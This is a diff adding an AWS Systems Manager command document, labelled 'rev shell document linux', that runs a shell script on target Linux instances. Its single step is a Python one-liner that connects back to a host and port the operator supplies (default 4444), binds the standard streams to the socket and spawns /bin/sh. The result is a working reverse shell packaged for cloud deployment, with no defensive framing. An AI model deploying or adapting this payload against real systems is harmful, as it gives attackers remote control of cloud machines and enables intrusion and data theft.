@@ -1,0 +1,28 @@
+{
+  "schemaVersion": "2.2",
+  "description": "rev shell document linux",
+  "parameters": {
+    "host": {
+      "description": "(Required) Specify the host.",
+      "type": "String"
+    },
+    "port": {
+      "description": "(Optional) Specify the port. The default value is 4444.",
+      "type": "String",
+      "default": "4444"
+    }
+  },
+  "mainSteps": [
+    {
+      "action": "aws:runShellScript",
+      "name": "shell",
+      "inputs": {
+        "runCommand": [
+          "port={{ port }}",
+          "host1={{ host }}",
+          "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"'$host1'\",'$port'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
+        ]
+      }
+    }
+  ]
+}
